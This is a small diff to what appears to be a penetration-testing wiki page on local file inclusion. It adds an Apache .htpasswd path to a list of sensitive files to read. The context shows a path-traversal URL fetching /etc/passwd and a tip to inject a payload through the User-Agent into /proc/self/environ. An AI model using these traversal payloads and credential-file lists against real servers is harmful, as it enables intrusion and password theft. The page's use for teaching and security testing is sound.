@@ -62,6 +62,7 @@ Another good list of places to check if possible
 /etc/anacrontab
 /etc/apache2/apache2.conf
 /etc/apache2/httpd.conf
+/etc/apache2/.htpasswd
 /etc/at.allow
 /etc/at.deny
 /etc/bashrc
@@ -372,5 +373,5 @@ http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
 
 Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
